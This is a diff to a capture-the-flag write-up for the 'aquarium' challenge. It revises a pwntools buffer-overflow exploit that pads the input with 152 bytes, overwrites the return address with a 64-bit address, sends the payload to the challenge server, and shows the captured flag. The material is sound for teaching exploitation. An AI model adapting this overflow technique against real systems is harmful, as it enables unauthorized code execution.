@@ -125,23 +125,19 @@ HOST = 'shell.actf.co'
 PORT = 19305
 p = remote(HOST,PORT)
 # p = process('./aquarium')
-# print(p.recvline())
 
 #: Exploit code
 offset = 'A' * 152
-flag_addr = p32(0x4011a6)
+flag_addr = p64(0x4011a6)
 exploit = offset + flag_addr
-print(repr(exploit))
 
 #: Send payload
-p.sendline('1000')
-p.sendline('1000')
-p.sendline('1000')
-p.sendline('1000')
-p.sendline('1000')
-p.sendline('1000')
+for prompts in range(6):
+	p.sendline('1000')
+
+print(p.recvuntil('Enter the name of your fish tank: '))
 p.sendline(exploit)
-print(p.recvline())
+p.interactive()
 ```
 #### We got our flag! 
 `actf{overflowed_more_than_just_a_fish_tank}`
